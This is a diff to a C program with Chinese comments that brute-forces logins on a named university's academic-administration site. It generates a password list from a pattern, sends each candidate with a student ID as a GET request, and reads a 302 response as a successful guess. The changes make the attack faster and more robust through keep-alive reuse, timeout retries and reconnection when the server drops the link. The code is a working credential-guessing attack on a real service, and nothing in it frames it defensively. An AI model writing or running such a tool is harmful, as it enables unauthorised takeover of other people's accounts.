@@ -15,37 +15,16 @@ int ShowLast(int last)
 		SetConsoleTitle(_itoa(last,t,10));
 	return 0;
 }
-/*char* QueryWebSite(char *stuid,char *pwd)
-{/*根据传入的学号、密码，向教务管理登陆页面发送GET请求，成功则返回前20字节，否则返回空*/
-/*	WSADATA WSAData={0}; 
-	SOCKET sockinf; 
-	struct sockaddr_in addr; 
-	struct hostent *pURL; 
-	char header[1024] = {0}; 
-	char text[21] = {0}; 
-
-	if (WSAStartup(MAKEWORD(2,2), &WSAData)) 
-		return NULL;
-	sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
-	pURL = gethostbyname("jwgl.lnu.edu.cn"); 
-	addr.sin_family = AF_INET; 
-	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
-	addr.sin_port = htons(80); 
-	sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,pwd);
-	connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
-	send(sockinf, header, strlen(header), 0); 
-
-	recv(sockinf, text, 20, 0);
-
-	closesocket(sockinf); 
-	WSACleanup(); 
-	return text;
-}*/
 int CheckLogin(char *SiteInfo)
-{/*根据传入的网页内容字符串判断本次尝试是否正确，若正确则返回1，否则返回0*/
-	if (!strstr(SiteInfo,"302"))//失败情况
+{/*根据传入的网页内容字符串判断本次尝试是否正确，若成功验证则返回1，失败返回0，服务端退出或其他情况返回-1*/
+	if (strstr(SiteInfo,"1.1 302"))//成功情况
+		return 1;
+	else if (strstr(SiteInfo,"close"))//服务端关闭连接
+		return -1;
+	else if (strstr(SiteInfo,"1.1 200"))//失败情况
 		return 0;
-	return 1;
+	else
+		return -1;
 }
 int CreatePwdList(char *pwd,char ***pwdList)
 {/*生成待使用的密码表pwdList，返回密码表中密码个数*/
@@ -102,13 +81,11 @@ int CreatePwdList(char *pwd,char ***pwdList)
 	}
 	return tnum;
 }
-
 int CheckBegin(char *stuid,char *pwd)
 {/*输入参数：	pwd(密码格式串)*/
 	char **PwdList = NULL;//指向密码表
-	char *sitebuf = NULL;//存放页面内容
-	int tnum,PwdNum;//剩余密码个数，密码个数
-	register int i,Ftime=0;
+	int PwdNum;//密码个数
+	register int i,tnum;//tnum:剩余密码个数
 
 	/*套接字初始化部分*/
 	int timeout = 60000;//超时1分钟
@@ -117,8 +94,8 @@ int CheckBegin(char *stuid,char *pwd)
 	SOCKET sockinf; 
 	struct sockaddr_in addr; 
 	struct hostent *pURL; 
-	char header[1024] = {0}; 
-	char text[21] = {0}; 
+	char header[1024] = {0};//请求头
+	char sitebuf[2049] = {0};//存放页面内容
 	if (WSAStartup(MAKEWORD(2,2), &WSAData))
 	{
 		printf("\n\n套接字启动失败！\n");
@@ -133,62 +110,62 @@ int CheckBegin(char *stuid,char *pwd)
 	addr.sin_family = AF_INET; 
 	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
 	addr.sin_port = htons(80); 
+	sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
 	setsockopt(sockinf,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(int));//设置recv超时为1分钟
+	connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
+
 
 	tnum = PwdNum = CreatePwdList(pwd,&PwdList);//生成密码表并返回个数
 	printf("\n共%d个待测试密码",PwdNum);
 	for (i=0;i<PwdNum;i++)
 	{
 		/*套接字初始化与查询分离为了加速*/
-		TimedOutFlag = 0;
 		do
 		{
-			sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
-			sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,PwdList[i]);
-			connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
+			sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: keep-alive\r\n\r\n",stuid,PwdList[i]);
 			send(sockinf,header,strlen(header),0); 
-			if (recv(sockinf,text,20,0) == -1)//捕获到超时
-				TimedOutFlag = 1;
-			sitebuf = text;
-			closesocket(sockinf);
+			if (recv(sockinf,sitebuf,2048,0) < 0)//捕获到超时
+			{
+				TimedOutFlag++;
+				if (TimedOutFlag == 3)//超时达到3次
+				{
+					if (IDNO == MessageBox(NULL,"请求超时次数达到3次，是否等待或是直接退出程序","Something wrong!",MB_YESNO))
+					{
+						printf("\n\n用户选择了终止程序！\n");
+						goto CLR;//用户选择停止程序
+					}
+				}
+			}
+			else
+				TimedOutFlag = 0;
 		}while(TimedOutFlag);//上一次超时
 
-		//sitebuf = QueryWebSite(stuid,PwdList[i]);//查询到的网页内容
-		if (!sitebuf)//若为空，失败次数+1
+		if (CheckLogin(sitebuf) == 1)//登录成功，提示，退出循环
 		{
-			if (Ftime < 10)
-				Ftime++;
-			else
-			{
-				Ftime = 0;
-				if (IDNO == MessageBox(NULL,"网页请求失败次数达到10次，是否等待或是直接退出程序","Something wrong!",MB_YESNO))
-				{
-					printf("\n\n用户选择了终止程序！\n");
-					break;//用户选择停止程序
-				}
-				i--;
-			}
+			ShowLast(-1);
+			printf("\n\n找到正确的密码！\nPwd = %s\n",PwdList[i]);
+			break;
+		}
+		else if (CheckLogin(sitebuf) == -1)//socket重连
+		{
+			closesocket(sockinf);
+			sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
+			setsockopt(sockinf,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(int));//设置recv超时为1分钟
+			connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
+			i--;
 		}
 		else
-		{
-			tnum--;
-			ShowLast(tnum);//标题栏显示剩余密码个数
-			if (CheckLogin(sitebuf))//登录成功，提示，退出循环
-			{
-				ShowLast(-1);
-				printf("\n\n找到正确的密码！\nPwd = %s\n",PwdList[i]);
-				break;
-			}
-		}
+			ShowLast(--tnum);//标题栏显示剩余密码个数
 	}
 	if (i == PwdNum)//所有情况全部尝试，没有找到正确的密码
 	{
 		ShowLast(-2);
 		printf("\n\n密码表中无法找到正确的密码！\n");
 	}
+CLR:
 	for (i=0;i<PwdNum;i++)
 		free(PwdList[i]);//释放内存
-	
+	closesocket(sockinf);//关闭socket
 	WSACleanup();//清除套接字
 	return 0;
 }
